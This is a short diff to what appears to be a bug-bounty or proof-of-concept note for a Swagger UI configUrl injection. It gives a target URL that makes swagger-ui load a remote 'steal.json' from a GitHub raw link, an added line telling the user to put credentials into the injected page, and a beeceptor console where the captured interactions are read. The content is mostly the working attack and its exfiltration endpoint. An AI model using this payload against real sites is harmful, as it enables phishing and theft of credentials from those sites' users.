@@ -6,4 +6,5 @@ Site:
 Exploit:
 - site.com/swagger-ui.html?configUrl=https://raw.githubusercontent.com/sahil3276/swagger/refs/heads/main/steal.json
 
-Now go to: https://app.beeceptor.com/console/sahil3276 and look for interactions
+PUT your credentials there.
+then go to: https://app.beeceptor.com/console/sahil3276 and look for interactions
